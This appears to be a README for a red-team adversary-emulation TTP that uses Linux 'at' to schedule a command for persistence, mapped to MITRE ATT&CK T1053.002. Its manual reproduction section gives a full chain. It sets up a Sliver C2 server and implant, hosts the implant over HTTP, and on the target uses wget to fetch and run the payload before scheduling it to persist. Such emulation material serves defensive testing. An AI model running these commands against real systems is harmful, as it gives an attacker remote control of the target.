# Systemwide At Job

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP enables the scheduling of a command to run at a specified time using the 'at' command.

## Arguments

- **implant_name**: The command to be executed by the at job. Default is "/bin/ls".

## Prerequisites

1. The 'at' command must be installed on the current system.
2. The executor must have root privileges to schedule an at job.

## Examples

You can run the TTP using the following example (after updating the arguments):
```bash
ttpforge run forgearmory//persistence/linux/systemwide-at-job/systemwide-at-job.yaml \
  --arg implant_name="/bin/ls"
```

## Steps

1. **setup**: This step checks if the 'at' command is installed on the current system. If not, it exits with an error message.
2. **schedule-at-job**: This step schedules the at job to run the command specified in the "implant_name" argument at 09:00.
3. **check-success**: This step checks if the at job was successfully scheduled and the command specified in the "implant_name" argument is present in the at job.

## Manual Reproduction Steps

```
### Attacker Configuration
# Escalate privileges to root
sudo su

# Download and install Sliver
curl https://sliver.sh/install | sudo bash

# Create implants folder
mkdir implants

# Get public IP (optional - if running on AWS instance)
# Note value for implant creation
curl icanhazip.com

# Run Sliver
sliver

# Generate implant
generate --http PUBLIC_IP_FROM_PREVIOUS_STEPS --save implants --skip-symbols --os linux

# Start listener
https -l 443

# Background the listener or open another tab
# and host the implant for download
pushd implants ; timeout 30 python3 -m http.server 8080 ; popd

### Target Configuration

# Escalate privileges to root
# (optional - depends on the goal(s) of your simulation)
sudo su

# Download and execute c2 payload
wget "http://${PUB_IP_FROM_PREV_STEP}:8080/${IMPLANT_NAME}"
chmod +x "${IMPLANT_NAME}"
./"${IMPLANT_NAME}" &


# Run implant at 9:00 AM
at -l
echo "cd ${HOME} && ${IMPLANT_NAME}" | at 09:00
at -l

# Clean up
at -r "$(at -l | awk -F ' ' '{print $1}')"
rm "${IMPLANT_NAME}"
```

## MITRE ATT&CK Mapping

- **Tactics**:
    - TA0003 Persistence
- **Techniques**:
    - T1053 Scheduled Task/Job
- **Subtechniques**:
    - T1053.002 Scheduled Task/Job At
